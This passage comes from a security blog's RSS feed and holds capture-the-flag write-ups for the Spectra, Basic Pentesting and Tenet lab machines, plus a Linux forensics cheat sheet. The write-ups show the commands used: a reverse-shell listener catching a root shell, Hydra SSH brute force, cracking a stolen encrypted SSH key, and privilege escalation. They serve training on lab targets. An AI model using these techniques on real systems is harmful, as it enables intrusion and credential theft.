</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ scp exploit.conf katie@10.10.10.229:/dev/shm
Password:
bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
exploit.conf                               100%  <span style="color:#ae81ff">775</span>    13.1KB/s   00:00
</code></pre></div><p>I&rsquo;ll use the following command and setup a <code>nc</code> listener on my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 <span style="color:#f92672">&amp;&amp;</span> cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
</code></pre></div><p>If I check on my listener, I have a root shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
$ nc -nvlp <span style="color:#ae81ff">9001</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35486</span>
whoami
root
id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210627002203606.png" alt="image-20210627002203606"  />
</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>TryHackMe - Basic Pentesting</title>
      <link>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</link>
      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/tryhackme/thm-basic-pentesting/</guid>
      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Type</strong>: Challenge/CTF</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools</strong>:
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>John the Ripper</li>
<li>smbclient</li>
</ul>
</li>
<li><strong>Skills Learned</strong>
<ul>
<li>Basics of enumeration</li>
<li>Brute-force attack</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
<p><img class="img-container" src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  />
</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is allowed on SMB.</p>
<p><img class="img-container" src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  />
</p>
<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
<p><img class="img-container" src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  />
</p>
<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
<p><img class="img-container" src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  />
</p>
<h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
<p><img class="img-container" src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  />
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115»
$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
<span style="color:#f92672">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.67.164/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
<span style="color:#f92672">===============================================================</span>
2021/05/29 13:43:47 Starting gobuster in directory enumeration mode
<span style="color:#f92672">===============================================================</span>
/development          <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.67.164/development/<span style="color:#f92672">]</span>
</code></pre></div><h4 id="development">/development</h4>
<p>The web has enabled directory listing on <code>/development</code>, and there are two text files in this directory:  <code>dev.txt</code> and <code>j.txt</code></p>
<p><img class="img-container" src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  />
</p>
<p><code>j.txt</code>  contains a note from K to J.</p>
<p><img class="img-container" src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  />
</p>
<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
<p><code>dev.txt</code> contains about project development logs.</p>
<p><img class="img-container" src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  />
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
<p><img class="img-container" src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  />
</p>
<h2 id="foothold">Foothold</h2>
<p>For foothold, I have two options: brute force and exploiting Apache Struts.</p>
<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the Apache Struts URI.</p>
<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
<p><img class="img-container" src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  />
</p>
<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
<p><img class="img-container" src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  />
</p>
<p>I visited <code>/struts2-rest-showcase-2.5.12/</code>, and it&rsquo;s there.</p>
<p><img class="img-container" src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  />
</p>
<p>It tried it with <code>metasploit</code> and it worked!</p>
<p><img class="img-container" src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  />
</p>
<h3 id="shell-as-jan">Shell as jan</h3>
<h4 id="ssh-brute-force">SSH Brute Force</h4>
<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
Hydra v9.0 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2019</span> by van Hauser/THC - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes.

...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.245.112   login: jan   password: armando
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
...&lt;SNIP&gt;...
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-05-29 14:20:56
</code></pre></div><p>Now I can login as Jan with SSH client.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ ssh jan@10.10.245.112 
jan@10.10.245.112<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
...&lt;SNIP&gt;...
Last login: Mon Apr <span style="color:#ae81ff">23</span> 15:55:45 <span style="color:#ae81ff">2018</span> from 192.168.56.102
jan@basic2:~$ id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>jan<span style="color:#f92672">)</span>
</code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="internal-enumeration">Internal Enumeration</h3>
<p>Enumerating Kay&rsquo;s home directory finds a readable SSH key</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ ls -la
total <span style="color:#ae81ff">20</span>
drwxr-xr-x <span style="color:#ae81ff">2</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> .
drwxr-xr-x <span style="color:#ae81ff">5</span> kay kay <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> ..
-rw-rw-r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> authorized_keys
-rw-r--r-- <span style="color:#ae81ff">1</span> kay kay <span style="color:#ae81ff">3326</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa
-rw-r--r-- <span style="color:#ae81ff">1</span> kay kay  <span style="color:#ae81ff">771</span> Apr <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2018</span> id_rsa.pub
</code></pre></div><p>I tried the key to SSH login locally as user Kay but it asked for a password, so I&rsquo;ll just grab the private key for cracking.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">jan@basic2:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----                                                      
Proc-Type: 4,ENCRYPTED                                                               
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
                                                                                     
IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
...&lt;SNIP&gt;...
4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
-----END RSA PRIVATE KEY-----
</code></pre></div><h3 id="cracking-id_rsa">Cracking id_rsa</h3>
<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash; cat kay_rsa.hash
kay_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
</code></pre></div><p><code>JtR</code> finds the password:  <code>beeswax</code>.</p>
<p><img class="img-container" src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  />
</p>
<h3 id="ssh---kay">SSH - Kay</h3>
<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
$ chmod <span style="color:#ae81ff">600</span> kay_rsa <span style="color:#f92672">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;kay_rsa&#39;</span>: 
Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>

...&lt;SNIP&gt;...
Last login: Mon Apr <span style="color:#ae81ff">23</span> 16:04:07 <span style="color:#ae81ff">2018</span> from 192.168.56.102
kay@basic2:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
</code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
<h3 id="su---root">SU - root</h3>
<p>In Kay&rsquo;s home directory,t here is a file called <code>pass.bak</code>. It contains this string:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
</code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kay@basic2:~$ sudo su -
root@basic2:~# id
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
root@basic2:~# ls -l
total <span style="color:#ae81ff">4</span>
-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1017</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> flag.txt
</code></pre></div><p>The flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
therefore might&#39;ve been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
out to me.

Happy hacking!
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://samsclass.info/124/proj14/p10xstruts.htm">https://samsclass.info/124/proj14/p10xstruts.htm</a></li>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Linux Forensics Command Cheat Sheet</title>
      <link>https://fahmifj.github.io/blog/linux-forensics-command-cheat-sheet/</link>
      <pubDate>Wed, 16 Jun 2021 19:15:16 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/linux-forensics-command-cheat-sheet/</guid>
      <description>My small cheat sheet for forensics and incident response on Linux systems</description>
      <content:encoded><![CDATA[<p>My short cheat sheet for forensics and incident response on Linux systems.  This will be updated over time.</p>
<h2 id="users-related">Users-related</h2>
<p>Last login</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ lastlog
$ last
</code></pre></div><p>Users with login shells</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /etc/passwd | grep sh$
</code></pre></div><p>List users' cron</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ <span style="color:#66d9ef">for</span> user in <span style="color:#66d9ef">$(</span>cat /etc/passwd | cut -f1 -d: <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo $user; crontab -u $user -l; <span style="color:#66d9ef">done</span>

<span style="color:#75715e"># users with shells only</span>
$ <span style="color:#66d9ef">for</span> user in <span style="color:#66d9ef">$(</span>cat /etc/passwd | grep sh$ | cut -f1 -d: <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo $user; crontab -u $user -l; <span style="color:#66d9ef">done</span>
</code></pre></div><p>SSH authorized keys</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find / -type f -name authorized_keys
</code></pre></div><h2 id="processes-networks-and-services">Processes, Networks and Services</h2>
<p>Show process tree with username  TTY, and wide output.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ps auxfww
</code></pre></div><p>Process details</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ lsof -p <span style="color:#f92672">[</span>pid<span style="color:#f92672">]</span>
</code></pre></div><p>Show all connections don&rsquo;t resolve names (IP only)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ lsof -i -n
$ netstat -anp

<span style="color:#75715e"># Look for tcp only</span>
$ netstat -antp
$ ss -antp
</code></pre></div><p>List all services</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ service --status-all
</code></pre></div><p>List firewall rules</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ iptables --list-rules
</code></pre></div><p>List all timers</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ systemctl list-timers --all
</code></pre></div><p>DNS related</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">/etc/hosts
/etc/resolv.conf
</code></pre></div><h2 id="files-and-folders">Files and Folders</h2>
<p>Show list files and folder with nano timestamp, sort by modification time (newest).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls --full-time -lt 
</code></pre></div><p>List all files that were modified on a specific date/time.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># List files which were modified on 2021-06-16 (YYYY-MM-DD)</span>
$ find / -newermt <span style="color:#e6db74">&#34;2021-06-16&#34;</span> -ls 2&gt;/dev/null

<span style="color:#75715e"># List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago)</span>
$ find / -newermt <span style="color:#e6db74">&#34;2021-05-01&#34;</span> ! -newermt <span style="color:#e6db74">&#34;2021-05-10&#34;</span> -ls 2&gt;/dev/null

<span style="color:#75715e"># List files which were modified on 2021-05-01 until 2021-05-09 (9 days ago) + add filter</span>
$ find / -newermt <span style="color:#e6db74">&#34;2021-05-01&#34;</span> ! -newermt <span style="color:#e6db74">&#34;2021-05-10&#34;</span> -ls 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#39;filterone\|filtertwo&#39;</span>

<span style="color:#75715e"># List files modified between 01:00 and 07:00 on June 16 2021.</span>
$ find / -newermt <span style="color:#e6db74">&#34;2021-06-16 01:00:00&#34;</span> ! -newermt <span style="color:#e6db74">&#34;2021-06-16 07:00:00&#34;</span> -ls 2&gt;/dev/null

<span style="color:#75715e"># List files that were accessed exactly 2 days ago.</span>
$ find / -atime <span style="color:#ae81ff">2</span> -ls 2&gt;/dev/null

<span style="color:#75715e"># List files that were modified in the last 2 days.</span>
$ find / -mtime -2 -ls 2&gt;/dev/null
</code></pre></div><p>File inspection</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ stat <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
$ exiftool <span style="color:#f92672">[</span>file<span style="color:#f92672">]</span>
</code></pre></div><p>Observe changes in files</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find . -type f -exec md5sum <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> | sort | uniq -c | grep <span style="color:#e6db74">&#39; 1 &#39;</span> | awk <span style="color:#e6db74">&#39;{print $2	}&#39;</span>
</code></pre></div><p>Look for <code>cap_setuid+ep</code> in binary capabilities</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ getcap -r /usr/bin/
$ getcap -r /bin/
$ getcap -r / 2&gt;/dev/null
</code></pre></div><p>SUID</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find / -type f -perm -u<span style="color:#f92672">=</span>s 2&gt;/dev/null
</code></pre></div><p>Log auditing</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ aureport --tty
</code></pre></div><h2 id="persistence-areas">Persistence areas</h2>
<p>Directories:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">/etc/cron*/
/etc/incron.d/*
/etc/init.d/*
/etc/rc*.d/*
/etc/systemd/system/*
/etc/update.d/*
/var/spool/cron/*
/var/spool/incron/*
/var/run/motd.d/*
</code></pre></div><p>Files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">/etc/passwd
/etc/sudoers
/home/&lt;user&gt;/.ssh/authorized_keys
/home/&lt;user&gt;/.bashrc
</code></pre></div><h2 id="references">References</h2>
<ul>
<li><a href="https://stackoverflow.com/questions/18339307/find-files-in-created-between-a-date-range">https://stackoverflow.com/questions/18339307/find-files-in-created-between-a-date-range</a></li>
<li><a href="https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users">https://unix.stackexchange.com/questions/119598/as-root-how-can-i-list-the-crontabs-for-all-users</a></li>
<li><a href="https://unix.stackexchange.com/questions/169798/what-does-newermt-mean-in-find-command">https://unix.stackexchange.com/questions/169798/what-does-newermt-mean-in-find-command</a></li>
<li><a href="https://ippsec.rocks/">https://ippsec.rocks/</a></li>
<li><a href="https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#incron">https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html#incron</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Tenet</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</link>
      <pubDate>Mon, 14 Jun 2021 21:46:38 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-tenet/</guid>
      <description>Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</description>
      <content:encoded><![CDATA[<p>Tenet is a medium difficulty Linux machine from Hack The Box. It features PHP deserialization vulnerability, which can be leveraged to gain a foothold. Enumerating the web configuration files finds a set of database credentials, and they are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>PHP deserialization attack</li>
<li>Race-condition</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>PHP</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full scan on Tenet discovers only two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.10.223 | grep <span style="color:#e6db74">&#39;^[0-9]&#39;</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
